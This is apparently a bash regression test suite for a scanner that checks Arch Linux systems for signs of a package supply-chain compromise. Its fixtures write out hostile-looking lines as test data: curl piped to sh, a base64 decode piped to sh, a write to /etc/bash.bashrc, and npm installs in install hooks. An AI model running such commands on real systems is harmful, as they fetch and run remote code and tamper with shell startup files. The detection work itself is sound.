#!/usr/bin/env bash
# SPDX-License-Identifier: AGPL-3.0-or-later
# Regression tests for atomic-arch-check.sh.
#
#   bash tests/run-tests.sh [path/to/atomic-arch-check.sh]
#
# Unit tests: source the detector definitions (every line above the first state-changing
# line, `nb_hits=0`) and call the matchers directly on fixture files.
# Integration tests: run a copy of the whole script with its hard-coded system paths
# redirected into a temp fixture tree, with a stub `pacman` first on PATH. Nothing outside
# the temp directory is read or written.
#
# Set KEEP=1 to keep the temp tree for inspection.
# Exit status: 0 = all tests passed, 1 = at least one failed, 2 = setup error.

HERE=$(cd "$(dirname "$0")" && pwd) || exit 2
SCRIPT=${1:-$HERE/../atomic-arch-check.sh}
[ -r "$SCRIPT" ] || { echo "cannot read: $SCRIPT" >&2; exit 2; }
WORK=$(mktemp -d) || exit 2
trap '[ -n "${KEEP:-}" ] || rm -rf "$WORK"' EXIT
[ -n "${KEEP:-}" ] && echo "kept: $WORK"

pass=0; fail=0
ok()  { pass=$((pass+1)); printf '  PASS  %s\n' "$1"; }
bad() { fail=$((fail+1)); printf '  FAIL  %s\n' "$1"; }

# expect <hit|miss> <description> <command...>
expect() {
  local want=$1 desc=$2 got=miss
  shift 2
  "$@" >/dev/null 2>&1 && got=hit
  if [ "$got" = "$want" ]; then ok "$desc"; else bad "$desc (wanted $want, got $got)"; fi
}
# contains|absent <description> <file> <fixed string>
contains() { if grep -qF -e "$3" "$2"; then ok "$1"; else bad "$1"; fi; }
absent()   { if grep -qF -e "$3" "$2"; then bad "$1"; else ok "$1"; fi; }

# ---------------------------------------------------------------- unit tests
sed -n '1,/^nb_hits=0/p' "$SCRIPT" | sed '$d' > "$WORK/defs.sh"
# shellcheck disable=SC1091
source "$WORK/defs.sh"

U=$WORK/unit; mkdir -p "$U"
{ echo 'npm install -g evil'; for i in $(seq 1 6000); do echo "echo padding line $i"; done; } > "$U/big.install"
{ echo 'depends=(atomic-lockfile)'; for i in $(seq 1 6000); do echo "# padding line $i"; done; } > "$U/big.PKGBUILD"
printf 'post_install() {\n  npm install -g evil\n}\n'   > "$U/small.install"
printf 'curl -s http://example.test/p | sh\n'          > "$U/plain.install"
printf 'curl -s http://example.test/p | "sh"\n'        > "$U/splice-pipe.install"
printf 'echo Y3VybA== | base64 -"d" | sh\n'            > "$U/splice-b64.install"
printf "echo 'x' >> /etc/bash.bashrc\n"                > "$U/rc-tamper.install"
printf 'echo "documentation about npm"\n'               > "$U/benign-text.install"
printf 'base64 input.txt > out.b64\n'                   > "$U/benign-encode.install"
printf 'curl -o file.tgz http://example.test/f.tgz\n'   > "$U/benign-download.install"
printf 'source=("x")\nprepare() {\n  cp ./lib/install-deps.mjs "$srcdir"\n}\n' > "$U/mjs.PKGBUILD"
printf 'post_install() {\n  cp ./lib/install-deps.mjs /opt\n}\n'              > "$U/mjs.install"
printf 'prepare() {\n  cp ./lib/"install-deps.mjs" "$srcdir"\n}\n'              > "$U/mjs-splice.PKGBUILD"
printf 'prepare() {\n  ./scripts/install-deps.sh\n}\n'                           > "$U/benign-deps.PKGBUILD"

echo "unit: pm_match / pkgbuild_match"
expect hit  "npm in a small install scriptlet"                pm_match "$U/small.install"
expect hit  "npm in an install scriptlet over 64 KiB"         pm_match "$U/big.install"
expect hit  "curl | sh (control)"                             pm_match "$U/plain.install"
expect hit  "curl | \"sh\" (quote-spliced pipe)"              pm_match "$U/splice-pipe.install"
expect hit  "base64 -\"d\" (quote-spliced decode)"            pm_match "$U/splice-b64.install"
expect hit  "write to /etc/bash.bashrc (control)"             pm_match "$U/rc-tamper.install"
expect miss "npm mentioned in plain text"                     pm_match "$U/benign-text.install"
expect miss "base64 encode without -d"                        pm_match "$U/benign-encode.install"
expect miss "curl download with no pipe to a shell"           pm_match "$U/benign-download.install"
expect hit  "IOC dep name in a PKGBUILD over 64 KiB"          pkgbuild_match "$U/big.PKGBUILD"
expect hit  "payload hook lib/install-deps.mjs in a PKGBUILD"  pkgbuild_match "$U/mjs.PKGBUILD"
expect hit  "payload hook lib/install-deps.mjs in a scriptlet" pm_match "$U/mjs.install"
expect hit  "quote-spliced lib/install-deps.mjs in a PKGBUILD" pkgbuild_match "$U/mjs-splice.PKGBUILD"
expect miss "unrelated install-deps.sh in a PKGBUILD"          pkgbuild_match "$U/benign-deps.PKGBUILD"

echo "unit: payload_hash_match / _exec_path"
REAL_SHA=${PAYLOAD_SHA256:-}
if [[ $REAL_SHA =~ ^[0-9a-f]{64}$ ]]; then ok "PAYLOAD_SHA256 is 64 lowercase hex characters"; else bad "PAYLOAD_SHA256 is 64 lowercase hex characters"; fi
printf 'payload-bytes' > "$U/payload.bin"; printf 'other-bytes' > "$U/other.bin"
PAYLOAD_SHA256=$(sha256sum "$U/payload.bin" | cut -d' ' -f1)
expect hit  "file with the payload SHA-256"                   payload_hash_match "$U/payload.bin"
expect miss "file with a different SHA-256"                   payload_hash_match "$U/other.bin"
expect miss "missing file"                                    payload_hash_match "$U/nope.bin"
expect miss "directory"                                       payload_hash_match "$U"
PAYLOAD_SHA256=$REAL_SHA
expect miss "payload file against the real SHA-256"           payload_hash_match "$U/payload.bin"
for pair in 'ExecStart=/var/lib/foo --x|/var/lib/foo' 'ExecStart=-/opt/x|/opt/x' 'ExecStart=!!/opt/y arg|/opt/y' 'ExecStart=@/opt/z name|/opt/z'; do
  in=${pair%%|*}; want=${pair##*|}; got=$(_exec_path "$in")
  if [ "$got" = "$want" ]; then ok "_exec_path: $in"; else bad "_exec_path: $in (got '$got')"; fi
done

echo "unit: _why"
why=$(_why "$U/splice-b64.install" 2>&1)
if grep -qE '\[machinery\] 1:' <<< "$why"; then
  ok "_why names [machinery] for a de-obfuscated match, number not glued to the tag"
else
  bad "_why names [machinery] for a de-obfuscated match, number not glued to the tag"
fi

# ---------------------------------------------------------------- integration tests
# make_tree <root> <infected 0|1>: a fixture pacman/systemd/AUR tree with a pacman stub.
make_tree() {
  local r=$1 inf=$2
  mkdir -p "$r"/{var/lib/pacman/local/goodpkg-1.0-1,var/log,var/cache/pacman/pkg,usr/share/libalpm/hooks,etc/pacman.d/hooks,etc/systemd/system,etc/systemd/user,usr/bin,bin,home,xdg-cache/yay/goodaur,xdg-config/systemd/user}
  printf '%%BUILDDATE%%\n1780000000\n\n' > "$r/var/lib/pacman/local/goodpkg-1.0-1/desc"
  printf 'post_install() {\n  echo done\n}\n' > "$r/var/lib/pacman/local/goodpkg-1.0-1/install"
  printf 'pkgname=goodaur\ndepends=(bash)\n' > "$r/xdg-cache/yay/goodaur/PKGBUILD"
  printf '[Service]\nExecStart=/opt/x\nRestart=always\nRestartSec=30\n' > "$r/xdg-config/systemd/user/xdgunit.service"
  printf '[Service]\nExecStart=/opt/y\nRestart=always\nRestartSec=30\n' > "$r/etc/systemd/user/globalunit.service"
  printf '[Service]\nExecStart=/usr/bin/ok\nRestart=on-failure\n'        > "$r/etc/systemd/system/normal.service"
  printf '%s\n' '[2026-06-10T10:00:00+0000] [ALPM] installed foo-bar (1.0-1)' \
                '[2026-06-11T10:00:00+0000] [ALPM] installed foo (2.0-1)' > "$r/var/log/pacman.log"
  printf 'foo\n' > "$r/foreign.txt"
  cat > "$r/bin/pacman" <<'EOF'
#!/usr/bin/env bash
# Test stub: answers the pacman queries the scanner makes, from fixture files.
case "$1" in
  -Qmq) cat "$FX/foreign.txt" ;;
  -Qo)  exit 1 ;;
  -Q)   echo "$2 1.0-1" ;;
  *)    exit 1 ;;
esac
EOF
  chmod +x "$r/bin/pacman"
  if [ "$inf" = 1 ]; then
    mkdir -p "$r/var/lib/pacman/local/evilpkg-1.0-1"
    printf '%%BUILDDATE%%\n1780000000\n\n' > "$r/var/lib/pacman/local/evilpkg-1.0-1/desc"
    printf 'post_install() {\n  npm install -g evil\n}\n' > "$r/var/lib/pacman/local/evilpkg-1.0-1/install"
    printf 'evilpkg\n' >> "$r/foreign.txt"
  fi
}

# run_scan <root>: writes <root>/out.txt (stdout+stderr) and <root>/rc (exit status).
run_scan() {
  local r=$1
  sed -e "s#/var/lib/pacman#$r/var/lib/pacman#g" \
      -e "s#/var/log/pacman.log#$r/var/log/pacman.log#g" \
      -e "s#/var/cache/pacman#$r/var/cache/pacman#g" \
      -e "s#/usr/share/libalpm#$r/usr/share/libalpm#g" \
      -e "s#/etc/pacman.d#$r/etc/pacman.d#g" \
      -e "s#/etc/systemd/system#$r/etc/systemd/system#g" \
      -e "s#/etc/systemd/user#$r/etc/systemd/user#g" \
      -e "s#/usr/bin/monero-wallet-gui#$r/usr/bin/monero-wallet-gui#g"       -e "s#^PAYLOAD_SHA256='[0-9a-f]*'#PAYLOAD_SHA256='${PAYLOAD_OVERRIDE:-$REAL_SHA}'#" \
      "$SCRIPT" > "$r/scan.sh"
  PATH="$r/bin:$PATH" HOME="$r/home" FX="$r" \
  XDG_CACHE_HOME="$r/xdg-cache" XDG_CONFIG_HOME="$r/xdg-config" \
      bash "$r/scan.sh" </dev/null >"$r/out.txt" 2>&1
  echo $? > "$r/rc"
}

echo "unit: ebpf_scan (bpftool and mountpoint stubbed; the sudo wrapper is not run)"
sed -n '/^  ebpf_scan() {/,/^  }$/p' "$SCRIPT" > "$U/ebpf.sh"
# shellcheck disable=SC1091
source "$U/ebpf.sh"
E=$WORK/ebpf; mkdir -p "$E"/{ok,fail,nomount,mounted}
# /bin/sh, not env: these tests set PATH to the stub dir alone, and env would need bash on PATH.
stub() { printf '#!/bin/sh\n%s\n' "$2" > "$1"; chmod +x "$1"; }
stub "$E/ok/mountpoint"      'exit 1'   # bpffs NOT mounted: bpftool must still be used
stub "$E/fail/bpftool"       'exit 1'
stub "$E/nomount/mountpoint" 'exit 1'
stub "$E/mounted/mountpoint" 'exit 0'
cat > "$E/ok/bpftool" <<'EOF'
#!/usr/bin/env bash
cat <<'MAPS'
1: hash  name hidden_pids  flags 0x0
	pids evil(666)
2: hash  name systemd_map  flags 0x0
	pids systemd(1)
3: array  name pid_iter.rodata  flags 0x480
	pids bpftool(999)
4: hash  name mystery  flags 0x0
	pids python3(77)
MAPS
EOF
chmod +x "$E/ok/bpftool"
PATH="$E/ok:$PATH"   ebpf_scan >"$E/ok.out"   2>"$E/ok.err"
PATH="$E/fail:$PATH" ebpf_scan >"$E/fail.out" 2>"$E/fail.err"
PATH="$E/nomount"    ebpf_scan >"$E/none.out" 2>"$E/none.err"
PATH="$E/mounted"    ebpf_scan >"$E/stat.out" 2>"$E/stat.err"
contains "ebpf: bpftool finds the hidden_pids IOC map name"          "$E/ok.out"   "hidden_pids"
contains "ebpf: bpftool is used even when bpffs is not mounted"      "$E/ok.out"   "__METHOD__=bpftool"
contains "ebpf: the 2 unrecognised maps are counted for review"      "$E/ok.out"   "__TOREVIEW__=2"
contains "ebpf: unrecognised map is listed for review"               "$E/ok.err"   "python3(77)"
absent   "ebpf: known systemd map is not listed for review"          "$E/ok.err"   "systemd_map"
contains "ebpf: a failing bpftool is reported as failed"             "$E/fail.out" "__METHOD__=failed"
absent   "ebpf: a failing bpftool prints no triage count"            "$E/fail.out" "__TOREVIEW__"
contains "ebpf: no bpftool and no bpffs is reported as nothing checked" "$E/none.out" "__METHOD__=none"
contains "ebpf: no bpftool falls back to stat() and says so"        "$E/stat.out" "__METHOD__=stat"

echo "integration: clean tree"
make_tree "$WORK/clean" 0
run_scan "$WORK/clean"
C=$WORK/clean/out.txt
if [ "$(cat "$WORK/clean/rc")" = 0 ]; then ok "clean: exit status 0"; else bad "clean: exit status 0 (got $(cat "$WORK/clean/rc"))"; fi
contains "clean: LIKELY CLEAN verdict"                        "$C" "LIKELY CLEAN"
contains "clean: eBPF skip is disclosed"                      "$C" "eBPF rootkit check did NOT run."
contains "clean: known-list skip is disclosed"                "$C" "Known-impacted package list was NOT checked."
contains "clean: eBPF skip names the real reason (no terminal for sudo)" "$C" "run from a terminal to get the sudo prompt"
absent   "clean: no misleading 'needs root' skip message"     "$C" "SKIPPED (needs root)"
contains "clean: foreign package in window is listed"         "$C" "    2026-06-11 foo"
absent   "clean: official 'foo-bar' is not reported as AUR"   "$C" "foo-bar"
contains "clean: user unit under XDG_CONFIG_HOME is flagged"  "$C" "xdgunit.service"
contains "clean: /etc/systemd/user unit is flagged"           "$C" "globalunit.service"
absent   "clean: unrelated system unit is not flagged"        "$C" "normal.service"

echo "integration: tree with npm in an install scriptlet"
make_tree "$WORK/infected" 1
run_scan "$WORK/infected"
I=$WORK/infected/out.txt
if [ "$(cat "$WORK/infected/rc")" = 1 ]; then ok "infected: exit status 1"; else bad "infected: exit status 1 (got $(cat "$WORK/infected/rc"))"; fi
contains "infected: finding is labelled as a heuristic (SUSPICIOUS)" "$I" "FOUND (SUSPICIOUS"
contains "infected: finding names the scriptlet"              "$I" "evilpkg-1.0-1/install"
contains "infected: verdict is POSSIBLE IMPACT"               "$I" "POSSIBLE IMPACT"

# ExecStart binary hash: the unit is found by the Restart fingerprint, then its binary is hashed.
echo "integration: ExecStart binary hash"
make_tree "$WORK/hashtree" 0
HT=$WORK/hashtree
printf 'payload-bytes' > "$HT/payload"
printf '[Service]
ExecStart=%s --run
Restart=always
RestartSec=30
' "$HT/payload" > "$HT/etc/systemd/system/gen.service"
run_scan "$HT"
absent   "hash: different binary is not reported as the payload" "$HT/out.txt" "matches the SHA-256"
contains "hash: unit is still listed for review"               "$HT/out.txt" "gen.service"
PAYLOAD_OVERRIDE=$(sha256sum "$HT/payload" | cut -d' ' -f1) run_scan "$HT"
contains "hash: matching binary is reported"                   "$HT/out.txt" "matches the SHA-256"

echo
echo "$pass passed, $fail failed"
[ "$fail" -eq 0 ]
